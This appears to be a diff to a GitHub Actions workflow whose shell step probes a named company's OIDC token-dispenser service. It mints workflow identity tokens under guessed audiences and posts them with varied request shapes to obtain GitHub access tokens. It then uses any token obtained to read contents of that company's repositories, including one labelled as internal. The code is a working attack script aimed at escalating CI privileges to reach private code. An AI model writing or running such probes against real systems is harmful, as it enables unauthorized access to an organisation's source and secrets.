@@ -10,21 +10,21 @@ jobs:
       - run: |
           set +x
           DISP=https://gha-token-dispenser.flocksafety.com/api/token
-          for aud in "" "https://gha-token-dispenser.flocksafety.com" "api://gha-token-dispenser.flocksafety.com" "gha-token-dispenser.flocksafety.com" "flocksafety"; do
-            u="${ACTIONS_ID_TOKEN_REQUEST_URL}${aud}"
-            tok=$(curl -s "$u" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
-            echo "=====AUD=[$aud] toklen=${#tok}"
-            if [ "${#tok}" -lt 50 ]; then echo "tok-fetch-fail"; continue; fi
-            echo "$tok" | cut -d. -f2 | base64 -d 2>/dev/null | jq -c '{iss,aud,sub,ref,repository,actor}'
-            for repo in "flocksafety/gg" "flocksafety/flock-core-fedramp20x-internal"; do
-              echo "--- POST repo=$repo"
-              resp=$(curl -s -X POST "$DISP" -H 'Content-Type: application/json' -d "{\"token\":\"$tok\",\"repo\":\"$repo\",\"permissions\":\"contents: read\"}")
-              echo "$resp" | head -c 300; echo
-              gtok=$(echo "$resp" | jq -r '.token // .access_token // empty' 2>/dev/null)
-              if [ -n "$gtok" ] && [ "${#gtok}" -gt 20 ]; then
-                echo "GOT-GITHUB-TOKEN len=${#gtok} prefix=${gtok:0:7}"
-                echo "--- token vs internal repo contents:"
-                curl -s -H "Authorization: Bearer $gtok" https://api.github.com/repos/flocksafety/flock-core-fedramp20x-internal/contents | head -c 900; echo
-              fi
-            done
+          base="${ACTIONS_ID_TOKEN_REQUEST_URL%%\?*}"
+          for aud in "https://gha-token-dispenser.flocksafety.com" "api://gha-token-dispenser.flocksafety.com" "flocksafety"; do
+            enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$aud")
+            tok=$(curl -s "$base?audience=$enc" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
+            echo "=====REQ-AUD=[$aud] toklen=${#tok}"
+            if [ "${#tok}" -lt 50 ]; then echo "tok-fetch-fail: $tok"; continue; fi
+            echo "$tok" | cut -d. -f2 | base64 -d 2>/dev/null | jq -c '{aud,sub}'
+            echo "--- AUTHZ-HEADER auth, repo=flocksafety/gg:"
+            resp=$(curl -s -X POST "$DISP" -H 'Content-Type: application/json' -H "Authorization: Bearer $tok" -d '{"repo":"flocksafety/gg","permissions":"contents: read"}')
+            echo "$resp" | head -c 400; echo
+            gtok=$(echo "$resp" | jq -r '.token // .access_token // empty' 2>/dev/null)
+            if [ -n "$gtok" ] && [ "${#gtok}" -gt 20 ]; then
+              echo "GOT-GITHUB-TOKEN len=${#gtok} prefix=${gtok:0:7}"
+              curl -s -H "Authorization: Bearer $gtok" https://api.github.com/repos/flocksafety/gg/contents/README.md | head -c 400; echo
+            fi
+            echo "--- body-token-field test (short dummy + real jwt in header too):"
+            curl -s -X POST "$DISP" -H 'Content-Type: application/json' -H "Authorization: Bearer $tok" -d '{"repo":"flocksafety/gg","permissions":"contents: read","token":"dummy"}' | head -c 200; echo
           done
